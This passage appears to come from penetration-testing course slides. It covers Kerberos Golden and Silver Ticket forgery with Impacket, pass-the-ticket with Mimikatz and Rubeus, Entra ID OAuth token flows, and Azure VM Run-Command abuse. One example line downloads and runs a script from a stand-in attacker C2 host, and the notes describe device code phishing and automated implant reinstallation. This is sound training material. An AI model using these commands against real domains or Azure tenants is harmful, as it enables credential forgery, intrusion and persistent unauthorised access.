- NT password hash of the krbtgt account.
- Domain SID. This is the Security Identifier for the domain. It begins with S-1-5-21 followed by three sets of numbers.
- Full domain name.

To generate a ticket with ticketer.py from Impacket, we use a command like this:

**ticketer.py -domain-sid S-1-5-21-721047592-4068106649-2889670365 domain sec560.local -nthash 5525e655c06299c7e4179e2cc5621fb3 Administrator**

![](_page_102_Picture_0.jpeg)

![](_page_103_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_104_Picture_0.jpeg)

![](_page_104_Picture_1.jpeg)

# **Overview**

If we have the password (or hash), we can forge a Service Ticket (ST).

- ST is encrypted and signed using the hash of the SPN's account
- We can even modify the PAC to escalate privileges
  - − Change the username, even to a nonexistent name
  - − Modify group membership
- This will work as long as the service doesn't ask the KDC to validate the second signature
  - − Services set to "Run as part of the operating system" will not verify
  - − CIFS (SMB), HOST, MSSQLSvc (SQL Server), and TERMSRV won't verify
  - − HTTP with IIS will always verify due to the nature of AppPools

Service Tickets are encrypted and signed using the password hash for the SPN's account. This means if we have the account's password (or hash), we can forge the ST for the service since we can both sign the Privileged Attribute Certificate (PAC) and encrypt the ticket.

We can change anything we want to in a forged ticket. We can change the username, even to a username that doesn't exist on the computer or in the domain. We can also change the group memberships so that we can access a system that we normally wouldn't have privileges to access.

Remember, there are two signatures on the PAC. The first is signed using the password hash of the service, which we have. The second signature uses the password hash of the krbtgt account. If we don't have this password hash, then we can't forge this second signature. This isn't usually a problem since the krbtgt signature is only verified on some services. Services that "run as part of the operating system" will not perform this secondary check. Service classes that will not perform the check include CIFS (SMB), HOST, MSSQLSvs (MSSQL Server), and TERMSRV (Terminal Services). However, HTTP will check when running with IIS due to the way accounts are handled in AppPools.

![](_page_105_Figure_0.jpeg)

104

# **Service Ticket and PAC**

![](_page_105_Picture_3.jpeg)

![](_page_105_Figure_4.jpeg)

#### **Service Ticket: Encrypted using target service NT Hash**

**Start / End / MaxRenew:** 05/12/2025 07:12:18 ; 05/12/2025 17:12:18 ; 12/12/2025 07:12:18 ; **Service Name:** cifs; file01.hiboxy.com **Target Name:** cifs; file01.hiboxy.com **Client Name:** bob; hiboxy.com

**Flags:** 40e10000

**Session Key:** 0x00000012eb212eb23ca12eb23c

45eb4124af9010bf13f…<snip>

**Privilege Attribute Certificate (PAC)**

Username: bob

SID: S-1-5-21-409 … <snip> Groups: Users … <snip>

**Signed using KDC LT Key (krbtgt) Signed using service's NT hash**

Kerberos is a stateless protocol. All state is stored in the tickets. The second signature (krbtgt) isn't always verified, which allows the Silver Ticket attack.

The Service Ticket (ST) sent to the service contains all the information that the target service needs to decide whether a client has access and, if so, what level of access. The PAC is the piece that contains the information about the user that the service uses to make access decisions. The PAC is signed with two keys to protect its integrity:

- Target Long-Term Key: This key is based on the target account's password hash
- KDC Long-Term Key: This key is based on the krbtgt NT password hash

To prevent the entire ST from being tampered with, it is encrypted using the target's long-term key. Since the user does not have this key (or the target's password hash), the client cannot read the contents of the ticket, including the PAC, sent to the service. If an attacker can get the password or hash, they can generate a ticket and PAC that will be accepted by a service as long as the service does not verify the second signature based on the password hash for the krbtgt account. To perform this second verification, the service needs to ask a KDC (domain controller) to verify the signature. Of course, this extra verification takes time. Services set to "run as part of the operating system" do not perform the secondary validation. Services such as CIFS (used with SMB), Host (for administration), and MSSQL have this setting by default, so they will not get the secondary verification. The Microsoft web server IIS will always request the secondary verification due to the way that authentication and authorization work with "app pools" in IIS. As such, the Silver Ticket attack won't work with IIS; however, the Kerberos attack can still allow an attacker to crack the password for the service.

![](_page_106_Picture_0.jpeg)

![](_page_106_Picture_1.jpeg)

# **Generating a Silver Ticket with Impacket**

**ticketer.py -nthash** *nt\_hash* **-domain-sid** *domain\_sid* **-domain** *domain\_name* **-spn** *service\_spn user\_name*

We can generate a Silver Ticket using ticketer.py from Impacket.

**-nthash** Target service's password hash

**-domain-sid** Domain SID (e.g., S-1-5-21-1339291983-1349129144-367733775)

**-domain** Full domain name

**-spn** SPN of the target service

**user\_name** Username in the forged ticket (does not have to exist)

We can use ticketer.py from Impacket to generate a Silver Ticket using the following syntax:

ticketer.py -nthash nt\_hash -domain-sid domain\_sid -domain domain\_name -spn service\_spn user\_name

The following table explains the above syntax:

-nthash Target service's password hash

-domain-sid Domain SID (e.g., S-1-5-21-1339291983-1349129144-367733775)

-domain Full domain name

-spn SPN of the target service

user\_name Username in the forged ticket (does not have to exist)

We then need to load the ticket into memory (Windows) or tell Linux to use the ticket. Let's take a look at how to do that.

![](_page_107_Picture_1.jpeg)

#### **Silver Ticket Use**

- Linux:
  - − Set the KRB5CCNAME environment variable
    - export KRB5CCNAME=TGS\_ccache\_file
  - − Use any tool capable of using Kerberos authentication (Impacket!)
    - wmiexec.py domain/user@hostname -k -no-pass
- Windows:
  - − Load the ticket with Mimikatz: kerberos::ptt ticket\_file
    - Mimikatz can generate the Silver Ticket too!
  - − Load with Rubeus: Rubeus.exe ptt /ticket:ticket\_file
  - − Almost every tool will use the ticket in memory

Once we create the ticket, we need to tell our operating system (and tools) to use it.

#### **Linux**

On Linux, we need to set the KRB5CCNAME environment variable to tell Linux to use the ticket when authenticating:

```
export KRB5CCNAME=TGS_ccache_file
```

Once we have this variable set, we can use any tool that will authenticate with Kerberos. The Impacket suite supports Kerberos, so we'll use that in our example:

```
wmiexec.py domain/user@hostname -k -no-pass
```

We need to specify the domain, username, and the target hostname. The -k tells the tool to use Kerberos to authenticate. Since we are using Kerberos, we do not need a password and use the -no-pass option.

#### **Windows**

On Windows, we can use Mimikatz to load the ticket. We could use Mimikatz to generate the ticket, but we aren't going to demonstrate that here. In Mimikatz, we use the ptt feature (pass-the-ticket) to load the

ticket into memory:

```
kerberos::ptt ticket_file
```

We can also use Rubeus, a Kerberos attack toolkit, to load the ticket:

```
Rubeus.exe ptt /ticket:ticket_file
```

We expect to use Kerberos authentication in the Windows domain, so most every tool will use this ticket in memory. We can use attack tools, or just normal admin tools, such as MSSQL Admin Tools.

![](_page_108_Picture_0.jpeg)

![](_page_109_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_110_Picture_2.jpeg)

# **OpenID Connect Flows**

- Entra ID's main flow type of authentication is OpenID Connect
- OpenID Connect builds on top of OAuth 2.0
  - − Complex protocol for using a Central Authentication Server over Web Flows
  - − Not backward-compatible with older protocols
  - − Entra ID Kerberos support
  - − Competitors such as Okta support Security LDAP
- Microsoft deems this "Modern Authentication," as it can support multiple password schemas such as MFA and FIDO2

Microsoft Entra ID has several OAuth2 flow types that it supports to provide access. For the uninitiated, the OpenID Connect framework can be very daunting, as it is a framework that requires OAuth2 flows to be available. Let's start with OpenID Connect itself and how the OAuth flows work.

OAuth2 has several "flow" types. The most common flow type you may encounter is called Code Flow. The Code Flow type works like this:

- A user goes to a website to authenticate, such as portal.azure.com.
- The user will be redirected to log in to Microsoft Entra ID.
- The successful authentication will provide the user with an access token.
- That access token is then used to validate that the user has been scoped to access the resources in question.

OAuth2 is not a legacy protocol. It was designed to federate and provide authorization and access control to different web services. It is the button that you see when you need to "log in with Facebook" or "log in with Apple." Entra ID supports this protocol as a "first-class citizen" but also supports SAML, WS-Federation, and Kerberos.

Entra ID is a modern authentication system because it can support multiple authentication types outside of the standard username and password, including password-less authentication methods and multi-factor authentications. Modern authentication does not necessarily apply to legacy protocols.

![](_page_111_Figure_0.jpeg)

Let's start with a flow in which we want to access a resource. In the example, the icon we are using is the Azure Infrastructure icon, but this could be Office, SharePoint, or any number of federated services. To simplify this transaction, consider that we will be going to the Azure Portal.

The first connection is from us to the Azure Portal (the middle of the slide deck). The transaction happens within our browser; keep in mind where the transactions occur. This redirect is within our browser.

![](_page_112_Figure_0.jpeg)

The browser will be redirected to the Entra ID login page. This page is hosted in the domain login.microsoftonline.com. The domain we are hitting may also be known as MSOL.

Recall from a previous slide the way the URL looks. It contains information that will be relevant to us:

https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize? redirect\_uri=https%3A%2F%2Fportal.azure.com%2Fsignin%2Findex%2F&respon se\_type=code%20id\_token&scope=https%3A%2F%2Fmanagement.core.windows.ne t%2F%2Fuser\_impersonation%20openid%20email%20profile&state=OpenIDConne ct.AuthenticationProperties%3DysnyqREDACTEDhOSq7&response\_mode=form\_po st&nonce=6377REDACTEDY1OTRk&client\_id=c44b4083-3bb0-49c1-b47d-974e53cbdf3c&site\_id=501430&prompt=select\_account&client-requestid=d28c579b-b8e7-4949-a820-98f0e00c824e&x-client-SKU=ID\_NET472&xclient-ver=6.12.2.0

The redirect URI goes back to portal.azure.com. The URI is where the browser will return to once we are done.

The response code is "code", which indicates that we are in an OAuth2 Code Flow.

The scope we are asking to be authorized includes specific OpenID connect scopes, such as the OpenID email scope.

The other items are specific to Azure, such as the tenant and the SKU of the client.

![](_page_113_Figure_0.jpeg)

At this point, we are asked to log in. This is where a few things happen, including:

We will be checked against Conditional Access Policies. Does the browser match? Are we within the allowed listed IP space? Do we need to do MFA in this IP space?

We will be prompted for MFA (multi-factor authentication) if it is enabled. It may also be that we have hardware FIDO2 tokens at this point.

Once we pass this gate, Conditional Access Policies are no longer checked. Keep this in mind.

![](_page_114_Figure_0.jpeg)

If the user flow is for a third-party application, such as an application working on our behalf, we may see a consent screen. Have you ever used a Salesforce application? Perhaps you have seen this in an application that integrates with Facebook, Twitter, or Instagram. This consent message allows a third-party application to act on our behalf. This is the part of the flow in which we would see this message. In the case of Azure Portal, we will not see this. What happens if we write a malicious application that works on behalf of the privileged user?

![](_page_115_Figure_0.jpeg)

We are now within an OpenID Connect flow that will return two key types. The first type of key material we will be getting is an access token. The access token contains our authentication material, the JWT (JSON Web Token). If someone were to steal this authentication material, they could log in to the Azure portal as if they were us. An example JWT will look like this:

"access\_token": "eyJ0eXREDACTEDCJ9.eyJhdWREDACTED.XREDACTED-IQ"

The value will be long, so we need to key in on a few things:

- The JWT will typically start with "ey".
- The JWT will have two dots (.) that separate each value, the encryption type, the body, and the signature.
- There will also be a "refresh token," which we will describe later.

![](_page_116_Figure_0.jpeg)

The access token is now provided to Azure via the client's browser. The access token contains various information about the user itself. This information is learned by sending the access token to a tool like http://jwt.ms, which can decode the token and provide all claims. The claims can help identify the user, the IP address of the request, and more pertinent information internal to Azure itself. The claims will include who provided the token, the Secure Token Server (STS), and what tenant this access token belongs to. Here are some of the more valuable claims found in a JWT:

**AUD**: The audience of the ClientID of the application; this is used as a validation tactic for the OAuth Access Token.

**IDP**: This is the Secure Token Server address or restful URL that provided the token.

**EXP**: In Unix epoch time, this is the expiration date of the token.

**AppID**: This is the application ID of the client that requested the token; every client is registered. Web browsers, Azure CLI, and Outlook clients all have their respective identifiers.

**AMR**: This claim is helpful to identify if the user came in over multifactor (MFA) or password (PWD) authentication.

**Ipaddress**: This is a V1 claim that is useful to identify the IP address for the authentication.

**UPN**: This is the username of the request.

#### Reference:

• https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens

![](_page_117_Figure_0.jpeg)

What occurs after the token is returned to the Azure Portal? The system must check that the access token is valid with the Microsoft Entra ID server. It must also check to ensure that the authentication is still valid and that it does not have strange expirations happening. This process does not involve the user. Instead, it's between the Microsoft Entra ID server and the application, which is Azure. The values in here have to be validated for access. Conditional access policy does not apply here. The access was already checked.

Not having continually checked access is a critical issue, as stealing the credentials will bypass the security measures in that policy.

![](_page_118_Figure_0.jpeg)

Let's talk about token expiration for a minute. The access token lifespan is 3600 seconds, or 1 hour. After 1 hour, the token expires. The token expiration is designed so that an attacker cannot steal the token and gain permanent access to a system. Having a short expiration window means that there must be a mechanism to refresh this token; otherwise, the system's usability will suffer. The user would constantly be asked to log in, which is sometimes not a great experience. What could we do? Well, what we have at our disposal is the Refresh Token. This is also referred to as the Primary Refresh Token (PRT). The Refresh Token is exchanged not between all the third-party systems but only to Entra ID. The Refresh Token itself can ask the Entra ID IdP to refresh the access token, obtain a new one, and allow for authentication to continue. If someone were to get the Primary Refresh Token, they could gain permanent access to an environment.

![](_page_119_Figure_0.jpeg)

At this point, we send the Refresh Token over to the Entra ID system. Remember that this is not heading through Azure and then to Entra ID; it's going directly to Azure to reduce the places where this Refresh Token can be intercepted.

![](_page_120_Figure_0.jpeg)

In the final part of the flow, we will get a new access token and return this value to the portal for validation. If an attacker can obtain the Primary Refresh Token, they can perform the same flow, bypassing conditional access policies, MFA, and other critical controls. Once the access token is returned refreshed, we can see that the system will pass it back to the party requesting it for validation.

![](_page_121_Figure_0.jpeg)

Several flow types exist to help facilitate multiple clients and device types. OAuth2 supports up to eight different flow types, and we will cover the most commonly seen ones here:

Code Flow: Code Flow, or three-legged flow, is the most common flow type. The idea behind Code Flow is that you, the user, can authorize and grant authorization to the client. The client is the application you wish to use. The flow will leverage your browser on the front end to get a grant. The grant is then exchanged for an access token. Every time you use a tool that "logs in with Google" or "logs in with Facebook," this is the flow that is used. The application asking you to log in with Google or Facebook is the client. This includes PKCE (pronounced pixie). PKCE stands for "Proof Key for Code Exchange" and is an extension to the authorization code flow to prevent CSRF and authorization code injection attacks (reference: https://www.oauth.com/oauth2-servers/pkce/).

Device Code Flow: Device Code Flow is useful when you cannot use a browser. You have probably used it. Have you ever seen on a TV app that you need to go to a web page and enter a code like IXH34H? The code you see presented allows for Device Code Flow OAuth. The Azure CLI will support this for flows that run on servers and do not have browsers.

Refresh Token Flow: Refresh Token Flow is the flow used to refresh your access token. Your access token lifetime is 1 hour, while the refresh token will have somewhere between 7 and 14 days of life before expiration.

Client Credentials Flow: Client Credentials Flow is a flow type used for things like Service Principals, where a static password or certificate is used to allow a client to authenticate. What types of clients use this? Terraform automation is an example. The Terraform module will use Client Credentials Flow to log in as a Service Principal and automate the creation of items.

![](_page_122_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_123_Picture_2.jpeg)

# **Infrastructure Components**

- Azure has several infrastructure components in its platform:
  - − Azure Compute: This is the Virtual Machine Compute Section
  - − Azure Blobs: This is the S3-equivalent Block Storage
  - − Azure DevOps: A DevOps build pipeline to deploy services
  - − Azure Backup: A backup service for Azure components, such as VMs
  - − Azure API Management: Create, manage and use internet-accessible APIs
- Each one of the components can used within an Azure Subscription

Azure includes over 80+ services that users can deploy individually. However, many of them stem from essential Cloud Computing components that have been productized. Azure has its version of Compute, Storage, and Network used in services like Azure Compute. Azure Compute is the virtual machine compute environment in which standard operating systems can be launched. Azure Compute is backed by Hyper-V and uses the same Hyper-V constructs as on-premises hosts. The Compute environment includes snapshots, disks, networking, and even backup and restore capability.

Azure also has a File and Block Storage environment called Azure Blobs. Storage Accounts create the Blob accounts, much like servers hold the files in your file system. From there, individual folders, called containers, will hold your files. Azure Blobs and General Storage Accounts can be used to provide both Block Storage and SMB Storage to Azure. It even has a Message Queue and data-like function to store objects.

Azure also has many developer-focused tools like Azure CosmosDB, Azure DevOps, Azure Apps, Azure Front Door, and many services that allow companies to deploy and scale software. These services are all contained in the Azure environment to enable users to roll out and deploy software in an Infrastructure Environment. Some of these services do not even apply to "Infrastructure as a Service" and are instead

# **Control Plane and Data Plane**

- To understand how to attack the Azure environment, we must understand Control Plane vs. Data Plane
- Control Plane is the out-of-band management for Azure to talk with Azure VMs
  - − Data Plane is what you typically interact with when you are moving packets on the network
- Logging in to Azure and telling the Azure platform to execute commands on a host is done through the Control Plane

![](_page_124_Picture_8.jpeg)

To understand how we can run commands in the Azure environment, we need to know how Control and Data Planes work. When Azure machines boot up, they have built-in Azure agents pre-installed. These Azure agents talk to the Azure platform to communicate different actions; some allow for machines to be booted and built on the first run; other options will let commands run on demand. The Control Plane components do not require VPN or any traditional network items to be set up, like in your traditional datacenter. They use an out-of-band communication channel to perform these actions. This agent is preinstalled and pre-configured within the Azure Platform.

The Data Plane is what we are typically using when we move laterally. The Data Plane generally is where the packets flow between network nodes. When you run WMIC or PowerShell remoting sessions, or mount a share, this traffic is run over the Data Plane. The Data Plane is not the subject of our cloud penetration testing logic. It is a component that we can use post-exploitation to fall back to traditional penetration testing. The Data Plane uniquely exists within cloud-enabling cloud penetration testing to be different from standard penetration testing.

When we are within the Azure Platform, in the Azure CLI, or the web interface and use specific items such as "azure run-command" and Azure Extensions, these actions taken through the Control Plane. The logging is done in the Azure Portal, not on the machine. The agents typically run in an elevated privilege such as "SYSTEM" or "root."

![](_page_125_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure
- Permissions on Azure

![](_page_126_Picture_2.jpeg)

# **Azure CLI Tools**

- Azure has several tools that can interoperate with the platform:
  - − Azure CLI: The main Python tool; the command to operate it is **az**
    - Cross-platform (Windows, Linux, macOS, Azure Cloud Shell, Docker)
    - Analogous to Amazon's **aws** tool
  - − Az PowerShell: Cmdlets for managing Azure via PowerShell
    - Requires PowerShell (5.1 or 7.2+) to run
- We will mainly use the Azure CLI tool (**az**)
- We can also install these tools on conquered machines to facilitate leveraging credentials from within the cloud as well

Microsoft, over the years, has published many different CLI tools to manage non-portal access to the Azure ecosystem. The traditional mechanism that was first published to end users was through PowerShell modules. These PowerShell modules required both Windows and specific PowerShell versions. Over the years, however, Microsoft started to work on multi-platform solutions for Azure management. Having multi-platform support solved one key issue: Azure Cloud shell support for the Azure SDK.

The Azure CLI tool is a Python-based application that is cross-platform. It has almost all the functionality of the Azure PowerShell equivalent. The developers of the tool continue to add features and should be considered the go-forward tool for Azure administration. We can use this tool on all platforms. The CLI

cloud shell environment ships with many tools and gives the administrators the ability to work with the Azure SDK without installing anything locally. Azure is not the only cloud provider; Google also features a cloud shell. After a specified time, the cloud shell will be stored and compressed for long-term storage and then decompressed and used when needed. You can determine that the Cloud Shell instance has been used by looking for Storage Accounts with the words "cloud shell" in them.

![](_page_127_Figure_0.jpeg)

The Azure CLI supports multiple types of subcommands and authentication mechanisms that we can use to attack Azure. We need to know how the tool works to understand this better. The Azure authentication library, which is now called MSAL (Microsoft Authentication Library), supports multiple OAuth2 and OpenID Connect flows for authentication. The standard flow is Code Flow, in which the Azure CLI tool is the "client" in the middle, and the user will see a browser window to support the Code Flow for authentication. It also supports several other flows.

The system can use **-u / -p** on the command line to pass the username and password. Using the command line for this is convenient when MFA is not used and the browser is unavailable. The other flow it can support can bypass Code Flow and instead use managed identities to log in to the CLI via the token values that the platform can send down to the system. Using this flow is convenient for when we want to attack from the inside of the platform, and we can leverage a managed assigned identity to do so.

The CLI tool can also support Device Code Flow, which supports browser-less logins by supplying a code to the Microsoft online website (MSOL) and using a different identity to log in. We can even combine this flow with phishing to lure an unsuspecting user into performing the login on our behalf while allowing our remote CLI to log in as them. Device Code Flow phishing is a nefarious attack, where the system administrator can be phished, and all the phishing lures are valid Microsoft accounts.

Finally, the tool supports many subcommands for standard access to individual services; for example, we can specify running, stopping, and starting VMs from within the **az vm** command. We can even perform administration tasks such as running commands or rebooting systems through the CLI tool. It is a very powerful way to walk through the permissions of the Azure system.

![](_page_128_Picture_2.jpeg)

# **Azure VM Operations**

- Azure has several mechanisms to facilitate VM management:
  - − Run Command
  - − Extensions
  - − Configuration Management (Desired State Configuration)
  - − Azure Automation
- Each one of these can run commands on the systems as an elevated user (root on Linux, SYSTEM on Windows)
- Depending on your Azure Role Permissions, you may be able to perform some of these actions

There are many ways you can execute code on the far-end system through the portal. Azure supports execution on the systems without requiring any extra tooling. We can leverage multiple operational items, normally used for systems management, to execute our attacks. These items can be helpful for administrators but can be abused by attackers. We will be walking through one of these run commands on a subsequent page. However, for completeness, we will also describe these other two mechanisms, as you may find that you have access to one but not the others.

Extensions are one of these options. These scripts can be applied to a machine to facilitate third-party software installation and allow us, as the administrator of the system, to customize the implementation of software. Extensions are run on the application, run as SYSTEM or Root, and execute bash or PowerShell scripts. The "custom" extensions can allow us to do almost anything. These extensions can be used for building a domain controller, joining a system to a domain, updating windows, and so on. They must be hosted on a Blob container, but they can do almost anything outside of that limitation.

Azure Automation is the Azure equivalent of SCCM. This toolchain has many items that help developers and system administrators keep their software running at its optimal state. Azure Automation can allow us to deploy runbooks that automate the deployment of systems, the configuration of software, and so on. Azure Automation can be used to patch systems and update them. It also has a collection of workers that can watch for processes or network items that either exist or don't. Using these workers, we can backdoor systems on events. Consider an event where your implant is detected by the blue team and then removed, and you can replace it automatically with a Control Plane action such as a worker script that installs a different implant.

![](_page_129_Picture_2.jpeg)

# **Running Commands on Virtual Machines**

- **Run-Command** leverages the internal Azure Agent in the virtual machine to run commands locally
- The output is truncated to 4KB of output
- Scripts can run between 20 seconds and a maximum of 90 minutes
- The VM must connect outbound to return results
  - − Required to be able to hit the Azure Public IP Address space on port 443

\$ **az vm run-command invoke -g ResourceGroup -n web --command-id RunShellScript --scripts "curl https://attacker-c2.invalid/1.sh -o 1.sh && bash 1.sh"**

One of the mechanisms we will use to run commands remotely on a system is Run-Command, which is a subcommand of the Azure VM compute engine; it is a single-use system that allows for the running of commands remotely. Run-Command supports multiple pre-built scripts. Here are some useful items in Run-Command:

- RunPowerShellScript/RunShellScript: This option (PowerShell for Windows and Shell for Linux) allows you to execute scripts right from the command line or from the portal.
- EnabledAdminAccount: Enables the local administrator account in Windows.
- EnableWindowsUpdate: Enables the Windows Update in Windows.
- IPConfig: Runs ipconfig.
- RDPSetting: Can set up RDP on a Windows machine.

From within the Azure CLI, a user with the contributor permissions of Virtual Machine (Virtual Machine Contributor or Subscription Level Contributor) can execute Run-Commands on a machine through the portal.

The minimum permission set would be the following action:

Microsoft.Compute/virtualMachines/runCommand/action

An example of a command-line script to run would be:

az vm run-command invoke --command-id RunPowerShellScript --name hiboxy-dc1 -g HIBOXY --script 'whoami'

In the above example, we have the Run-Command invoking a command. The PowerShell Script option is set, and instead of running a local PowerShell script, we are passing the script from the command line.

What is the PowerShell script we are passing? The command is whoami. In the returned JSON, we will see a message value that contains our output. Since our output is less than 4000 bytes, it should be fully displayed.

#### Reference:

• https://docs.microsoft.com/en-us/azure/virtual-machines/windows/run-command

![](_page_131_Picture_2.jpeg)

# **Course Roadmap**

Section 1: Miniature Engagement, Recon, and Scanning

Section 2: Scanning and Initial Access

Section 3: Post-Exploitation

Section 4: Domain Privilege Escalation and Lateral Movement

Section 5: Persistence and Evading Controls

Section 6: CTF and Next Steps

• Persistence

Lab 5.1: Persistence

- Living Off Trusted Sites with Ngrok
- AV/EDR Evasion
- Application Control Bypass

Lab 5.2: MSBuild

- Reporting
- More Kerberos Attacks
- Domain Dominance

Lab 5.3: Domain Dominance

• Golden Ticket

Lab 5.4: Golden Ticket

• Silver Ticket

Lab 5.5: Silver Ticket

- OpenID
- Azure Infrastructure
- Running Commands on Azure

![](_page_131_Picture_27.jpeg)

![](_page_132_Picture_1.jpeg)

# **What's Better than Domain Admin? Global Admin!**

- Domain Admin ("DA") in an on-prem domain that typically provides the capability to perform any function and access any resource
- The equivalent role in Entra ID is Global Administrator ("GA")
  - − Granted to the "first" account or tenant account
  - − Can be granted to any user
  - − Other Administrator roles have checks and balances
- Entra ID Connect Synchronization requires Global Administrator access

|                                               | Can a User with Role in Column A reset a password for a user with a Role in Row 2? |                         |                                               |                           |                                 |                       |                           |                      |               |                          |                                  |                |                         |                  |
|-----------------------------------------------|------------------------------------------------------------------------------------|-------------------------|-----------------------------------------------|---------------------------|---------------------------------|-----------------------|---------------------------|----------------------|---------------|--------------------------|----------------------------------|----------------|-------------------------|------------------|
|                                               | (No Role)                                                                          | Global<br>Administrator | Privileged<br>Authentication<br>Administrator | Helpdesk<br>Administrator | Authentication<br>Administrator | User<br>Administrator | Password<br>Administrator | Directory<br>Readers | Guest Inviter | Message Center<br>Reader | Privileged Role<br>Administrator | Reports Reader | Groups<br>Administrator | (Any Other Role) |
| Global<br>Administrator                       | Yes                                                                                | Yes                     | Yes                                           | Yes                       | Yes                             | Yes                   | Yes                       | Yes                  | Yes           | Yes                      | Yes                              | Yes            | Yes                     | Yes              |
| Privileged<br>Authentication<br>Administrator | Yes                                                                                | Yes                     | Yes                                           | Yes                       | Yes                             | Yes                   | Yes                       | Yes                  | Yes           | Yes                      | Yes                              | Yes            | Yes                     | Yes              |
| Helpdesk<br>Administrator                     | Yes                                                                                | No                      | No                                            | Yes                       | Yes                             | No                    | No                        | Yes                  | Yes           | Yes                      | No                               | Yes            | No                      | No               |
| Authentication<br>Administrator               | Yes                                                                                | No                      | No                                            | Yes                       | Yes                             | No                    | No                        | Yes                  | Yes           | Yes                      | No                               | Yes            | No                      | No               |
| User<br>Administrator                         | Yes                                                                                | No                      | No                                            | Yes                       | No                              | Yes                   | No                        | Yes                  | Yes           | Yes                      | No                               | Yes            | No                      | No               |
| Password<br>Administrator                     | Yes                                                                                | No                      | No                                            | No                        | No                              | No                    | Yes                       | Yes                  | Yes           | No                       | No                               | No             | No                      | No               |

Domain Administrator is typically the most coveted group in a classic on-premises Active Directory environment. The Domain Administrator rights can be elevated to even more permissions through the use of Enterprise Administrators. A Domain Administrator is equivalent to the root user in Unix but can be root across all machines. Is there a comparable role in Entra ID? The answer is yes; it is called the Global Administrator.

Global Administrator is the first user in the Entra ID environment, and by default, it does not have access to Azure. Remember, Entra ID roles do not translate to Azure Roles. How does the Entra ID role of Global Administrator gain access to Azure items? The user can be elevated using a switch that adds to the User Access Administrator built-in role in Azure. The User Access Administrator built-in role grants access to add users to subscriptions and resources for administration.

Global Administrators should be tightly controlled, as they can do almost anything in the environment. More shocking is that because you are the "root" or "domain admin" of the Entra ID environment, you can also grant these permissions to third parties in the OpenID Connect Consent actions. Consenting to a third party means that a foreign application like Salesforce, or even malicious applications, can also be granted Global Administrator access through the consent of the application. Users who constantly use Global Administrator permissions for their day-to-day work can inadvertently grant global permissions to third parties by just consenting as they browse the internet. As with on-premises Active Directory, we should only use these accounts when needed and not for day-to-day work.

![](_page_133_Picture_2.jpeg)

# **Azure Permissions**

- Azure has built-in roles and custom roles that can be used to perform actions on the platform
  - − Microsoft may refer to this as Azure RBAC from time to time
- Each built-in role has a specific GUID
- Roles in Azure have the following nomenclature:
  - − Owner: Owns a service and can add users
  - − Contributor: Consider this to be Read/Write access or Modify access to the service
  - − Reader: These types of roles only have Read access to the service

Azure, like other cloud providers, has many built-in roles. We have already mentioned some of these roles, such as User Access Administrator, which allows someone like the Global Administrator to add new users to the Azure Platform and provide permissions to the resources in Azure. You may also find that Azure calls the IAM system Azure RBAC. Azure has many overly permissive roles that you can find. One example is Log Analytics Contributor.

The Log Analytics Contributor role has alarmingly great permissions in an environment; not uncommonly, it features \*/read, which means anyone with this role can read all aspects of the Azure resources in the scope of someone who is granted this role. It also gives the person the ability to run commands on virtual machines by creating and applying for extensions.

Azure roles typically employ the following terminology:

Owner: Someone with this role owns a service, can add users to the service, and can read, write, and execute the service.

Contributor: Consider this role as having "read and write" access or modify access to the service. However, a Contributor can never add a user to the service itself.

Reader: This role only has read access to the service. A Reader cannot add any users to the service and cannot modify items.

#### References:

- https://docs.microsoft.com/en-us/azure/role-based-accesscontrol/#:~:text=Azure%20role%2Dbased%20access%20control%20(Azure%20RBAC)%20is%20a,ne ed%20to%20perform%20their%20jobs.
- https://docs.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#log-analyticscontributor

# **Permissions IAM Document**

```
"properties": {
  "roleName": "machine-roles",
    "description": "",
    "assignableScopes": [
      "/subscriptions/27bce287-...-
78f62be9eaac/resourceGroups/560ng"
    ],
    "permissions": [
      {
        "actions": [
          "*/read",
          "Microsoft.ClassicCompute/virtualMachines/extensions/*"
